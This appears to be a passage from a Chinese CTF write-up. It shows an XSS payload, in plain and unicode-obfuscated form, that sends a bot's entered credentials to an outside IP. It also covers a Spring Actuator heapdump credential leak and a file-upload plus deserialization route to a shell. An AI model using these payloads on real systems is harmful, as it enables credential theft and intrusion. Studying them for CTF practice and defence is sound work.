class="string">&#x27;http://a.o.com:8080/client/list&#x27;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;catch (e) &#123;</span><br><span class="line">                    console.log(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            const element = <span class="keyword">await</span> page.isVisible(<span class="string">&#x27;button[langtag=&quot;word-login&quot;]&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (element) &#123;</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;username&quot;]&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;password&quot;]&#x27;</span>, PASSWORD);</span><br><span class="line">                <span class="keyword">await</span> page.click(<span class="string">&#x27;button[langtag=&quot;word-login&quot;]&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">await</span> page.waitForTimeout(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">await</span> page.close();</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (e instanceof errors.TimeoutError)&#123;</span><br><span class="line">                console.log(e);</span><br><span class="line">                <span class="keyword">await</span> page.close();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                console.log(e);</span><br><span class="line">            &#125;     </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先获取新页面，然后访问三次 <code>http://a.o.com:8080/client/list</code></p><p>你看看眼熟不，/client/list 刚好就是刚才展示 xss 的路径，你品，你细品。这个 host 眼熟不，这可是在 docker 里面设置的地址映射啊.</p><p>ならば　答えはひとつだ</p><p>就是 xss, 接下来就是分析这个机器人事怎么操作的了.</p><p>首先要看有无 <code>button[langtag=&quot;word-login&quot;]</code>  这玩意</p><p>那我们就需要设置一个 button 了，不过我们可以在这里面下点毒</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot;</span> langtang=&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>$(‘#username’) 是一个 jQuery 选择器，用于选择具有指定 id 属性的 HTML 元素。在这个选择器中，#username 表示要选择 id 为 “username” 的元素。会从输入获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;username&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;flag&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再根据这个</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;username&quot;]&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">                <span class="keyword">await</span> page.fill(<span class="string">&#x27;input[name=&quot;password&quot;]&#x27;</span>, PASSWORD);</span><br></pre></td></tr></table></figure><p>让机器人去输入我们设置好的登录框，从而通过 input 获取到 flag.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">input</span> name=<span class="string">&quot;username&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;username&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span> required=<span class="string">&quot;&quot;</span> langtag=<span class="string">&quot;word-username&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">input</span> name=<span class="string">&quot;password&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;password&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span> required=<span class="string">&quot;&quot;</span> langtag=<span class="string">&quot;word-password&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>如此，圈套已设，只等敌军进入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form <span class="keyword">class</span>=<span class="string">&quot;m-t&quot;</span> onsubmit=<span class="string">&quot;return false&quot;</span>&gt;</span><br><span class="line">            &lt;div <span class="keyword">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span><br><span class="line">                &lt;<span class="built_in">input</span> name=<span class="string">&quot;username&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;username&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Username&quot;</span> required=<span class="string">&quot;&quot;</span> langtag=<span class="string">&quot;word-username&quot;</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div <span class="keyword">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span><br><span class="line">                &lt;<span class="built_in">input</span> name=<span class="string">&quot;password&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;password&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;password&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;form-control&quot;</span> placeholder=<span class="string">&quot;Password&quot;</span> required=<span class="string">&quot;&quot;</span> langtag=<span class="string">&quot;word-password&quot;</span>&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;button onclick=<span class="string">&quot;fetch(&#x27;http://43.143.192.19:1145/&#x27;,&#123;method:&#x27;POST&#x27;,body:$(&#x27;#username&#x27;)[0].value+&#x27;___&#x27;+$(&#x27;#password&#x27;)[0].value&#125;);&quot;</span> langtag=<span class="string">&quot;word-login&quot;</span>&gt;Login&lt;/button&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这么复杂数据传输起来不方便，👴不喜欢，换一个</p><h3 id="exp"><span id="exp"> exp</span></h3><p>unicode 就行，而且控制台大大支持 unicode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr=node4.buuoj.cn:<span class="number">26658</span></span><br><span class="line">conn_type=tcp</span><br><span class="line">vkey=<span class="number">123</span></span><br><span class="line">remark=&lt;/a&gt;&lt;sCRiPt&gt;document.write`\u003c\u0068\u0074\u006d\u006c\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u0068\u0065\u0061\u0064\u003e\u003c\u002f\u0068\u0065\u0061\u0064\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u0062\u006f\u0064\u0079\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0066\u006f\u0072\u006d\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u006d\u002d\u0074\u0022\u0020\u006f\u006e\u0073\u0075\u0062\u006d\u0069\u0074\u003d\u0022\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0066\u0061\u006c\u0073\u0065\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0064\u0069\u0076\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0067\u0072\u006f\u0075\u0070\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0069\u006e\u0070\u0075\u0074\u0020\u006e\u0061\u006d\u0065\u003d\u0022\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0069\u0064\u003d\u0022\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0063\u006f\u006e\u0074\u0072\u006f\u006c\u0022\u0020\u0070\u006c\u0061\u0063\u0065\u0068\u006f\u006c\u0064\u0065\u0072\u003d\u0022\u0055\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u0020\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0064\u003d\u0022\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0064\u0069\u0076\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0064\u0069\u0076\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0067\u0072\u006f\u0075\u0070\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0069\u006e\u0070\u0075\u0074\u0020\u006e\u0061\u006d\u0065\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0069\u0064\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0074\u0079\u0070\u0065\u003d\u0022\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0063\u006c\u0061\u0073\u0073\u003d\u0022\u0066\u006f\u0072\u006d\u002d\u0063\u006f\u006e\u0074\u0072\u006f\u006c\u0022\u0020\u0070\u006c\u0061\u0063\u0065\u0068\u006f\u006c\u0064\u0065\u0072\u003d\u0022\u0050\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u0020\u0072\u0065\u0071\u0075\u0069\u0072\u0065\u0064\u003d\u0022\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0022\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0064\u0069\u0076\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u0062\u0075\u0074\u0074\u006f\u006e\u0020\u006f\u006e\u0063\u006c\u0069\u0063\u006b\u003d\u0022\u0066\u0065\u0074\u0063\u0068\u0028\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0034\u0033\u002e\u0031\u0034\u0033\u002e\u0031\u0039\u0032\u002e\u0031\u0039\u003a\u0031\u0031\u0034\u0035\u002f\u0027\u002c\u007b\u006d\u0065\u0074\u0068\u006f\u0064\u003a\u0027\u0050\u004f\u0053\u0054\u0027\u002c\u0062\u006f\u0064\u0079\u003a\u0024\u0028\u0027\u0023\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065\u0027\u0029\u005b\u0030\u005d\u002e\u0076\u0061\u006c\u0075\u0065\u002b\u0027\u005f\u005f\u005f\u0027\u002b\u0024\u0028\u0027\u0023\u0070\u0061\u0073\u0073\u0077\u006f\u0072\u0064\u0027\u0029\u005b\u0030\u005d\u002e\u0076\u0061\u006c\u0075\u0065\u007d\u0029\u003b\u0022\u0020\u006c\u0061\u006e\u0067\u0074\u0061\u0067\u003d\u0022\u0077\u006f\u0072\u0064\u002d\u006c\u006f\u0067\u0069\u006e\u0022\u003e\u004c\u006f\u0067\u0069\u006e\u003c\u002f\u0062\u0075\u0074\u0074\u006f\u006e\u003e\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u003c\u002f\u0066\u006f\u0072\u006d\u003e\u000a\u0020\u0020\u0020\u0020\u003c\u002f\u0062\u006f\u0064\u0079\u003e\u000a\u003c\u002f\u0068\u0074\u006d\u006c\u003e`&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./npc -config ./conf/npc.conf</span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231101233054.png" alt="微信截图_20231101233054"></p><p>终于拿到了艹，30s 点一次，👴tm 以为 x 不进去了</p><p>まだまだね、弱い！</p><h1 id="deserializeupload"><span id="deserializeupload"> Deserialize?Upload!</span></h1><h2 id="actuator"><span id="actuator"> actuator😫</span></h2><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102082010.png" alt="微信截图_20231102082010"></p><p>首先，题目有个🚢♥的依赖，显然👴不知道这是干啥的，怎么办，学！</p><p><a href="https://www.cnblogs.com/caoweixiong/p/15325382.html">Spring boot——Actuator 详解 - 曹伟雄 - 博客园 (cnblogs.com)</a></p><p>配置方面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>有了这个依赖，那么 Spring 就会自动开放 <code>/actuator/health</code>  和 <code>/actuator/info</code>  这两个路径</p><p>访问 <code>[127.0.0.1:9090/actuator/](http://127.0.0.1:9090/actuator/)</code> , 可以得到 /acturator 的路由</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;_links&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;self&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;health&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/health&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;health-path&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/health/&#123;*path&#125;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;info&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/info&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;env&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/env&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;env-toMatch&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/env/&#123;toMatch&#125;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;heapdump&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://127.0.0.1:9090/actuator/heapdump&quot;</span>,</span><br><span class="line">            <span class="string">&quot;templated&quot;</span>: <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是一些经常使用的路径</p><table><thead><tr><th style="text-align:center">HTTP 方法</th><th style="text-align:center">Endpoint</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">GET</td><td style="text-align:center">/actuator</td><td style="text-align:center">查看有哪些路径</td></tr><tr><td style="text-align:center">GET</td><td style="text-align:center">/actuator/env</td><td style="text-align:center">查看所有环境属性，看 Spring 的的 properties, 但是会自动脱敏掉一些 secret key 等敏感信息</td></tr><tr><td style="text-align:center">GET</td><td style="text-align:center">/actuator/health</td><td style="text-align:center">查看运行指标</td></tr><tr><td style="text-align:center">GET</td><td style="text-align:center">/actuator/info</td><td style="text-align:center">查看 properties 中 info 开头的属性，沒啥用</td></tr><tr><td style="text-align:center">GET</td><td style="text-align:center">/actuator/heapdump</td><td style="text-align:center">获取 JVM 的 heap dump</td></tr></tbody></table><p>🤣默认 Actuator  <code>/actuator/health</code>  和 <code>/actuator/info</code>  两个 endpoint，如果要开放其他 endpoint 的話，需在在 application.properties 中做设置。<img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102085646.png" alt="微信截图_20231102085646"></p><p>Heap dump（堆转储）是指将一个 Java 进程的内存中的对象信息和数据结构以二进制格式写入文件，以便进行内存分析和排查内存泄漏等问题。Heap dump 包含了 Java 堆内存中的对象实例、对象引用关系、类信息等，它是诊断和调试 Java 应用程序的重要工具之一。</p><p>👴说点人话：反正 Heap dump 事内存相关的东西，肯定有敏感信息，👴就是要把它下下来进行一通乱超，不知道你们怎么忍得住的，事👴直接拿起来狠狠地分析.</p><p>怎么分析，当时事用 jdk 自带的 jhat</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jhat -J-Xmx512M <span class="string">&quot;/path/to/heapdump&quot;</span></span><br></pre></td></tr></table></figure><p>然后就会本地起一个服务器，里面就加载内存的内容</p><p>md, 依托✍特，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">securityFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ((HttpSecurity)((FormLoginConfigurer)((FormLoginConfigurer)((HttpSecurity)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)((ExpressionUrlAuthorizationConfigurer.AuthorizedUrl)http.authorizeRequests().antMatchers(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/&quot;</span>&#125;)).permitAll().antMatchers(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/admin/**&quot;</span>&#125;)).authenticated().and()).formLogin().loginProcessingUrl(<span class="string">&quot;/login&quot;</span>)).permitAll()).and()).csrf().disable();</span><br><span class="line">        <span class="keyword">return</span> (SecurityFilterChain)http.build();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>🧀spring 安全配置， <code>http.authorizeRequests().antMatchers(new String[]&#123;&quot;/&quot;&#125;).permitAll()</code>  表示对 / 路由访问允许任意用户，</p><p><code>antMatchers(new String[]&#123;&quot;/admin/**&quot;&#125;).authenticated()</code>  表示 <code>/admin/</code>  开头验证用户</p><p><code>.formLogin().loginProcessingUrl(&quot;/login&quot;).permitAll()</code> /login 的表达登录不需要验证</p><p>这里就是让👴拿到 password</p><h2 id="题目实践"><span id="题目实践"> 题目实践😓😡</span></h2><p>wcsndm,sb 东西，题目环境没了，行吧，👴本地搭一个，nmd 套模板整了个 docker-compose, 告诉👴nmd <code>project name must not be empty</code> , 你 tmd 倒是告诉👴哪里没有 project name, 阿米诺斯，一格德拉米.</p><p>只能手动 docker build.</p><p>同样拿到 heapdump</p><p>直接打开</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jvisualvm</span><br></pre></td></tr></table></figure><p>别问👴哪里装，这 nmjava 自带的</p><p>进行一波 OQL 查询</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select s from java.util.LinkedHashMap$Entry s where /spring.security.user.password/.test(s.key)</span><br></pre></td></tr></table></figure><p>这里用的事正则测试 /rgexp/.test () 的形式，虽然里面内容没用到啥正则，只是走个形式而已，别问👴为啥不直接查 value,nmd value 是个对象还未知，你查个√⑧.</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102101315.png" alt="微信截图_20231102101315"></p><p>tmd /login 登进去，让👴看看怎么个事</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102102004.png" alt="微信截图_20231102102004"></p><p>源赖氏一个后台管理系统，能用文件上传功能的地方.</p><h2 id="反序列化分析"><span id="反序列化分析"> 反序列化分析😛</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&#123;&quot;/deserialize&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="meta">@RequestParam(&quot;b64str&quot;)</span> String b64str)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] serialized = Base64.getDecoder().decode(b64str);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">SafeObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SafeObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很美好对吧，jackson 链直接打，但是👴发现了不对劲，md 有毒</p><p>还是看看远处的 <code>SafeObjectInputStream</code>  吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SafeObjectInputStream</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">super</span>(is);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass input) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (BLACKLIST.contains(input.getName())) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Hacker!!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;com.fasterxml.jackson.databind.node.POJONode&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        BLACKLIST.add(<span class="string">&quot;java.security.SignedObject&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>都给你 ban 了，rnm, 出题人真的阴险，现在不把 jackson 链 ban 了，都不敢反序列化了是吧😅</p><p>怎么绘世呢</p><h2 id="文件上传-反序列化组合拳"><span id="文件上传-反序列化组合拳"> 文件上传 + 反序列化组合拳😤</span></h2><p>题目给了文件上传的功能，那总不能不用吧，要不然题目整这 β÷ 玩意干嘛呀.😅</p><p>正好前面通过 env 泄露得知 java_home 的位置</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102103809.png" alt="微信截图_20231102103809"></p><p>什么，你不知道 java_home 事干嘛的？</p><p>来，跟👴一起念:</p><p><code>JAVA_HOME</code>  是一个环境变量，用于指示 Java 开发工具和应用程序在计算机上的安装位置。它主要用于以下几个方面的作用：</p><ol><li><strong>Java 开发工具的定位</strong>： <code>JAVA_HOME</code>  变量告诉计算机的操作系统和其他开发工具 Java 开发工具的安装位置。这对于编译、运行和调试 Java 程序非常重要。例如，当你使用 Java 编译器 ( <code>javac</code> ) 编译 Java 代码时，系统需要知道  <code>JAVA_HOME</code>  的位置以找到  <code>javac</code>  可执行文件。</li><li><strong>Java 运行时环境（JRE）的定位</strong>：除了开发工具， <code>JAVA_HOME</code>  也可以用于定位 Java 运行时环境（JRE）的位置。JRE 包含了运行 Java 应用程序所需的类库和运行时组件。如果你的系统上有多个不同版本的 Java 安装，设置  <code>JAVA_HOME</code>  可以确保你使用的是正确的 Java 版本。</li><li><strong>应用程序的定位</strong>：某些 Java 应用程序可能需要知道 Java 的安装位置，以便正确配置自己。通过设置  <code>JAVA_HOME</code>  环境变量，这些应用程序可以轻松找到所需的 Java 运行时环境。</li><li><strong>开发工具和构建工具的配置</strong>：许多 Java 集成开发环境（IDE）和构建工具（如 Maven 和 Gradle）使用  <code>JAVA_HOME</code>  变量来配置其内部使用的 Java 环境。这有助于确保项目在正确的 Java 版本下编译和运行。</li><li><strong>跨平台兼容性</strong>：通过使用  <code>JAVA_HOME</code>  变量，可以使 Java 开发环境在不同的操作系统上更具可移植性。它允许开发人员编写一次代码，然后在不同平台上使用相同的  <code>JAVA_HOME</code>  变量来运行代码。</li></ol><p>总之， <code>JAVA_HOME</code>  是一个关键的环境变量，用于确保计算机上的 Java 开发工具、应用程序和运行时环境能够正确地找到和使用 Java 安装。它在 Java 开发和部署过程中起到重要作用，特别是在多版本 Java 安装和跨平台开发的情况下。</p><p>不说人话就是这样，这是伟大的 ChatGPT 说的，👴翻译一下就是，运行脚本的位置在那，要运行的 class 也在那，所以有啥 class 放那，他就能加载啥 class.</p><p>所以接下来要干啥懂了没，上传点具有攻击性的 class 到 javahome 里面，狠狠地入它一波.</p><p>而且不是有反序列化吗，到这你不可能还不知道吧，创造一个反序列化带有直接恶意操作的类，直接 getshell😊</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"></span><br><span 